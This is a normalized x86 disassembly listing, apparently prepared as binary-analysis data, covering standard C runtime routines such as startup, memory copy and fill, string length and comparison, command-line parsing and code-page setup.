push eax
call sub_4037b2
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_402116
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_402116
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_40ef77
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_4134f0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
push ecx
call sub_4066cf
add esp 0x4
test eax eax
jne r-xdata
sub_413550
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
movzx edx [ ebx + ecx ]
test dx dx
je r-xdata
pop edi
xor edx edx
pop esi
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
sub ecx 0x2
xor edx edx
pop esi
mov eax 0x8007007a
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
sub_4135a8
push 0x20
push r--data
call sub_413ff0
push 0x8
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4136d3
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_414035
retn
mov [ rw-data ] 0x1
push 0x8
call sub_41334d
pop ecx
push [ ebp + 0x8 ]
call sub_40b064
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_401c91
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_401c91
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_413711
push 0x58
push r--data
call sub_413ff0
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_407272
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_410f9a
test eax eax
jne r-xdata
push 0x1c
call sub_4136e8
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_402390
mov [ ebp - 0x4 ] esi
call sub_40bccd
test eax eax
jns r-xdata
push 0x10
call sub_4136e8
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_4050e2
mov [ rw-data ] eax
call sub_40149f
test eax eax
jns r-xdata
push 0x1b
call sub_4103d9
call sub_41181c
test eax eax
jns r-xdata
push 0x8
call sub_4103d9
push 0x1
call sub_401dab
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_4103d9
call sub_405fe5
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_4103d9
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_40ee53
jmp sub_41386e
push eax
call sub_404ac1
push ecx
push eax
push esi
push __dos_header
call sub_403430
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
sub_41387e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
leave
retn
push esi
call sub_413e90
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_4138f0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_413974 ]
jmp [ ecx * 4 + jump_table_4139f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413a60 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_413bfc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_413b00 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_413bfc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_413a60 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_413bfc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413a60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413a60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413a60 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_413bfc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_413bfc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_413bfc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_413c51
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_40b492
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40f7a1
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40f7a1
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_413d3c
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_401400
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_402611
add esp 0x20
pop esi
pop ebp
retn
sub_413d6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_401400
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_402611
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40f862
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_405547
pop ebx
leave
retn
sub_413e10
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40548d
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_413e90
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_413f20
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_413fa8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_413ff0
push sub_4104c0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_414049
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor edx edx
push edi
mov edi [ ebp + 0xc ]
mov [ ebx ] edx
mov esi ecx
mov [ edi ] 0x1
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
inc [ ebx ]
test esi esi
je r-xdata
mov edi [ ebp + 0xc ]
xor ecx ecx
test edx edx
sete cl
push 0x22
add eax 0x2
mov edx ecx
pop ecx
jmp r-xdata
movzx ecx [ eax ]
add eax 0x2
test cx cx
je r-xdata
mov cx [ eax ]
mov [ esi ] cx
add esi 0x2
test edx edx
jne r-xdata
sub eax 0x2
jmp r-xdata
cmp cx 0x20
je r-xdata
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
cmp cx 0x9
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edx
je r-xdata
movzx ecx [ eax ]
cmp ecx 0x20
je r-xdata
xor ecx ecx
mov [ esi - 0x2 ] cx
inc [ edi ]
pop edi
pop esi
leave
retn
mov [ eax ] edx
add eax 0x2
jmp r-xdata
cmp ecx 0x9
jne r-xdata
cmp [ eax ] dx
je r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
inc [ edi ]
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
cmp [ eax ] 0x5c
je r-xdata
add eax 0x2
inc edx
cmp [ eax ] 0x22
jne r-xdata
test edx edx
jne r-xdata
test dl 0x1
jne r-xdata
dec edx
test esi esi
je r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
shr edx 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc [ ebx ]
push 0x5c
pop ecx
mov [ esi ] cx
add esi 0x2
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] edx
jne r-xdata
xor ecx ecx
xor edi edi
cmp [ ebp - 0x4 ] ecx
sete cl
mov [ ebp - 0x4 ] ecx
cmp [ eax + 0x2 ] 0x22
jne r-xdata
inc [ ebx ]
mov edi [ ebp + 0xc ]
jmp r-xdata
xor ecx ecx
mov [ esi ] cx
add esi 0x2
test edi edi
je r-xdata
cmp ecx 0x20
je r-xdata
add eax 0x2
jmp r-xdata
xor edx edx
cmp [ eax ] dx
je r-xdata
add eax 0x2
jmp r-xdata
test esi esi
je r-xdata
cmp ecx 0x9
je r-xdata
xor edi edi
inc edi
xor edx edx
jmp r-xdata
inc [ ebx ]
mov [ esi ] cx
add esi 0x2
sub_41419f
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_40e6d0
add esp 0xc
test eax eax
je r-xdata
call sub_40a4e5
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_415340
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_4141f6
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_404ad7
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_41422c
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_413163
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_414216
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_414256
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_413364
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_414285
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_414256
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_414256
pop ecx
sub_4142ec
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_41431b
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_413e10
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_41437f
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_410f09
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40674f
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40674f
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_413e10
add esp 0xc
